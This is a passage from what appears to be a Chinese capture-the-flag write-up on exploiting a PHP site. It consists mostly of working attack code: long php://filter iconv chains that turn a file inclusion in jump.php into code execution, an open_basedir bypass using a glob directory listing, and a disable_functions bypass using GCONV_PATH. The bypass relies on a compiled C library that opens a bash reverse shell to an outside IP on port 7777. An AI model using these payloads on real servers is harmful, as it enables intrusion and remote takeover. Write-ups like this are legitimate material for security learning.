class=p>|</span>convert.iconv.CSA_T500.L4<span class=p>|</span>convert.iconv.ISO_8859-2.ISO-IR-103<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UTF-16<span class=p>|</span>convert.iconv.ISO6937.UTF16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.GBK.BIG5<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.865.UTF16<span class=p>|</span>convert.iconv.CP901.ISO6937<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP869.UTF-32<span class=p>|</span>convert.iconv.MACUK.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO88597.UTF16<span class=p>|</span>convert.iconv.RK1048.UCS-4LE<span class=p>|</span>convert.iconv.UTF32.CP1167<span class=p>|</span>convert.iconv.CP9066.CSUCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500.L4<span class=p>|</span>convert.iconv.ISO_8859-2.ISO-IR-103<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500-1983.UCS-2BE<span class=p>|</span>convert.iconv.MIK.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L5.UTF-32<span class=p>|</span>convert.iconv.ISO88594.GB13000<span class=p>|</span>convert.iconv.CP950.SHIFT_JISX0213<span class=p>|</span>convert.iconv.UHC.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UNICODE<span class=p>|</span>convert.iconv.ISIRI3342.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.JS.UNICODE<span class=p>|</span>convert.iconv.L4.UCS2<span class=p>|</span>convert.iconv.UCS-4LE.OSF05010001<span class=p>|</span>convert.iconv.IBM912.UTF-16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.MAC.UTF16<span class=p>|</span>convert.iconv.L8.UTF16BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP367.UTF-16<span class=p>|</span>convert.iconv.CSIBM901.SHIFT_JISX0213<span class=p>|</span>convert.iconv.UHC.CP1361<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L5.UTF-32<span class=p>|</span>convert.iconv.ISO88594.GB13000<span class=p>|</span>convert.iconv.CP949.UTF32BE<span class=p>|</span>convert.iconv.ISO_69372.CSIBM921<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500-1983.UCS-2BE<span class=p>|</span>convert.iconv.MIK.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO2022KR.UTF16<span class=p>|</span>convert.iconv.L6.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.base64-decode/resource<span class=o>=</span>/tmp/resources/4
</span></span><span class=line><span class=cl>/jump.php?link<span class=o>=</span>php://filter/convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.UTF8.UTF16<span class=p>|</span>convert.iconv.WINDOWS-1258.UTF32LE<span class=p>|</span>convert.iconv.ISIRI3342.ISO-IR-157<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO2022KR.UTF16<span class=p>|</span>convert.iconv.L6.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.865.UTF16<span class=p>|</span>convert.iconv.CP901.ISO6937<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSA_T500.UTF-32<span class=p>|</span>convert.iconv.CP857.ISO-2022-JP-3<span class=p>|</span>convert.iconv.ISO2022JP2.CP775<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM891.CSUNICODE<span class=p>|</span>convert.iconv.ISO8859-14.ISO6937<span class=p>|</span>convert.iconv.BIG-FIVE.UCS-4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.UTF8.UTF16LE<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.iconv.UCS2.UTF8<span class=p>|</span>convert.iconv.8859_3.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L5.UTF-32<span class=p>|</span>convert.iconv.ISO88594.GB13000<span class=p>|</span>convert.iconv.CP950.SHIFT_JISX0213<span class=p>|</span>convert.iconv.UHC.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP869.UTF-32<span class=p>|</span>convert.iconv.MACUK.UCS4<span class=p>|</span>convert.iconv.UTF16BE.866<span class=p>|</span>convert.iconv.MACUKRAINIAN.WCHAR_T<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.JS.UNICODE<span class=p>|</span>convert.iconv.L4.UCS2<span class=p>|</span>convert.iconv.UCS-2.OSF00030010<span class=p>|</span>convert.iconv.CSIBM1008.UTF32BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.PT.UTF32<span class=p>|</span>convert.iconv.KOI8-U.IBM-932<span class=p>|</span>convert.iconv.SJIS.EUCJP-WIN<span class=p>|</span>convert.iconv.L10.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO88597.UTF16<span class=p>|</span>convert.iconv.RK1048.UCS-4LE<span class=p>|</span>convert.iconv.UTF32.CP1167<span class=p>|</span>convert.iconv.CP9066.CSUCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO88597.UTF16<span class=p>|</span>convert.iconv.RK1048.UCS-4LE<span class=p>|</span>convert.iconv.UTF32.CP1167<span class=p>|</span>convert.iconv.CP9066.CSUCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.PT.UTF32<span class=p>|</span>convert.iconv.KOI8-U.IBM-932<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.JS.UNICODE<span class=p>|</span>convert.iconv.L4.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM921.NAPLPS<span class=p>|</span>convert.iconv.855.CP936<span class=p>|</span>convert.iconv.IBM-932.UTF-8<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.JS.UNICODE<span class=p>|</span>convert.iconv.L4.UCS2<span class=p>|</span>convert.iconv.UCS-2.OSF00030010<span class=p>|</span>convert.iconv.CSIBM1008.UTF32BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSGB2312.UTF-32<span class=p>|</span>convert.iconv.IBM-1161.IBM932<span class=p>|</span>convert.iconv.GB13000.UTF16BE<span class=p>|</span>convert.iconv.864.UTF-32LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.BIG5HKSCS.UTF16<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.PT.UTF32<span class=p>|</span>convert.iconv.KOI8-U.IBM-932<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.BIG5HKSCS.UTF16<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO2022KR.UTF16<span class=p>|</span>convert.iconv.L6.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.base64-decode/resource<span class=o>=</span>php://filter//convert.base64-encode/resource<span class=o>=</span>/tmp/resources/4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#post</span>
</span></span><span class=line><span class=cl><span class=nv>0</span><span class=o>=</span>phpinfo<span class=o>()</span><span class=p>;</span>
</span></span></code></pre></div><p>接下来要构造绕过<code>open_basedir</code>和<code>disable_functions</code>读取目录和文件</p><p>glob伪协议绕过<code>open_basedir</code>读取目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/jump.php?link<span class=o>=</span>php://filter/convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.CSISO2022KR<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM921.NAPLPS<span class=p>|</span>convert.iconv.855.CP936<span class=p>|</span>convert.iconv.IBM-932.UTF-8<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.iconv.UCS2.UTF-8<span class=p>|</span>convert.iconv.CSISOLATIN6.UCS-4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.IBM869.UTF16<span class=p>|</span>convert.iconv.L3.CSISO90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500.L4<span class=p>|</span>convert.iconv.ISO_8859-2.ISO-IR-103<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UTF-16<span class=p>|</span>convert.iconv.ISO6937.UTF16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.GBK.BIG5<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.865.UTF16<span class=p>|</span>convert.iconv.CP901.ISO6937<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP869.UTF-32<span class=p>|</span>convert.iconv.MACUK.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO88597.UTF16<span class=p>|</span>convert.iconv.RK1048.UCS-4LE<span class=p>|</span>convert.iconv.UTF32.CP1167<span class=p>|</span>convert.iconv.CP9066.CSUCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500.L4<span class=p>|</span>convert.iconv.ISO_8859-2.ISO-IR-103<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500-1983.UCS-2BE<span class=p>|</span>convert.iconv.MIK.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L5.UTF-32<span class=p>|</span>convert.iconv.ISO88594.GB13000<span class=p>|</span>convert.iconv.CP950.SHIFT_JISX0213<span class=p>|</span>convert.iconv.UHC.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.863.UNICODE<span class=p>|</span>convert.iconv.ISIRI3342.UCS4<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.JS.UNICODE<span class=p>|</span>convert.iconv.L4.UCS2<span class=p>|</span>convert.iconv.UCS-4LE.OSF05010001<span class=p>|</span>convert.iconv.IBM912.UTF-16LE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.MAC.UTF16<span class=p>|</span>convert.iconv.L8.UTF16BE<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP367.UTF-16<span class=p>|</span>convert.iconv.CSIBM901.SHIFT_JISX0213<span class=p>|</span>convert.iconv.UHC.CP1361<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L5.UTF-32<span class=p>|</span>convert.iconv.ISO88594.GB13000<span class=p>|</span>convert.iconv.CP949.UTF32BE<span class=p>|</span>convert.iconv.ISO_69372.CSIBM921<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CP861.UTF-16<span class=p>|</span>convert.iconv.L4.GB13000<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.L6.UNICODE<span class=p>|</span>convert.iconv.CP1282.ISO-IR-90<span class=p>|</span>convert.iconv.CSA_T500-1983.UCS-2BE<span class=p>|</span>convert.iconv.MIK.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.CSIBM1161.UNICODE<span class=p>|</span>convert.iconv.ISO-IR-156.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.ISO2022KR.UTF16<span class=p>|</span>convert.iconv.L6.UCS2<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.INIS.UTF16<span class=p>|</span>convert.iconv.CSIBM1133.IBM943<span class=p>|</span>convert.iconv.IBM932.SHIFT_JISX0213<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.iconv.SE2.UTF-16<span class=p>|</span>convert.iconv.CSIBM1161.IBM-932<span class=p>|</span>convert.iconv.MS932.MS936<span class=p>|</span>convert.iconv.BIG5.JOHAB<span class=p>|</span>convert.base64-decode<span class=p>|</span>convert.base64-encode<span class=p>|</span>convert.iconv.UTF8.UTF7<span class=p>|</span>convert.base64-decode/resource<span class=o>=</span>/tmp/resources/4
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#post</span>
</span></span><span class=line><span class=cl><span class=nv>0</span><span class=o>=</span><span class=nv>$a</span><span class=o>=</span>new DirectoryIterator<span class=o>(</span><span class=s2>&#34;glob:///*&#34;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>foreach<span class=o>(</span><span class=nv>$a</span> as <span class=nv>$f</span><span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>{</span>echo<span class=o>(</span><span class=nv>$f</span>-&gt;__toString<span class=o>()</span>.<span class=s1>&#39; &#39;</span><span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>}</span> exit<span class=o>(</span>0<span class=o>)</span><span class=p>;</span>
</span></span><span class=line><span class=cl>?&gt;
</span></span></code></pre></div><p><img class=lazyload src=/svg/loading.min.svg data-src=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png data-srcset="https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png 1.5x, https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png 2x" data-sizes=auto alt=https://raw.githubusercontent.com/githubmof/img/main/img/202309101152330.png title=img></p><p>小技巧：蚁剑的插件<code>bypass_disable_function</code>可查看哪些函数可用</p><p>iconv和putenv没禁用，这里可以考虑so文件命令执行，或者LD_PRELOAD</p><p>传文件可以使用ftp，或者xml，或者利用php上传配合php临时文件</p><h4 id=思路一-iconv>思路一 iconv</h4><p>参考：https://blog.lxscloud.top/2022/04/15/PHP-Bypass-disable_function/</p><p>特点：iconv没禁</p><p>vps开一个ftp服务器，存放下面文件</p><p>evil.c</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;unistd.h&gt;</span>
</span></span><span class=line><span class=cl><span class=c1>#include &lt;stdio.h&gt;</span>
</span></span><span class=line><span class=cl><span class=n>__attribute__</span> <span class=p>((</span><span class=n>__constructor__</span><span class=p>))</span> <span class=n>void</span> <span class=n>angel</span> <span class=p>(</span><span class=n>void</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=n>unsetenv</span><span class=p>(</span><span class=s2>&#34;LD_PRELOAD&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=n>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7777 &lt;&amp;1&#39;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>编译生成 .so</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>gcc</span> <span class=n>evil</span><span class=o>.</span><span class=n>c</span> <span class=o>-</span><span class=n>o</span> <span class=n>evil</span><span class=o>.</span><span class=n>so</span> <span class=o>-</span><span class=n>shared</span> <span class=o>-</span><span class=n>fPIC</span>
</span></span></code></pre></div><p>字符集 gconv-modules（其中evil对应evil.so</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>module</span>  <span class=n>evil</span><span class=o>//</span>    <span class=n>INTERNAL</span>    <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>evil</span>    <span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=n>module</span>  <span class=n>INTERNAL</span>   <span class=n>evil</span><span class=o>//</span>    <span class=o>/</span><span class=n>tmp</span><span class=o>/</span><span class=n>evil</span>    <span class=mi>2</span>
</span></span></code></pre></div><p>evil.php（下载为.txt，方便后面包含触发</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&lt;</span><span class=err>?</span><span class=n>php</span>
</span></span><span class=line><span class=cl><span class=n>putenv</span><span class=p>(</span><span class=s2>&#34;GCONV_PATH=/tmp/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=n>iconv</span><span class=p>(</span><span class=s2>&#34;evil&#34;</span><span class=p>,</span> <span class=s2>&#34;UTF-8&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=err>?</span><span class=o>&gt;</span>
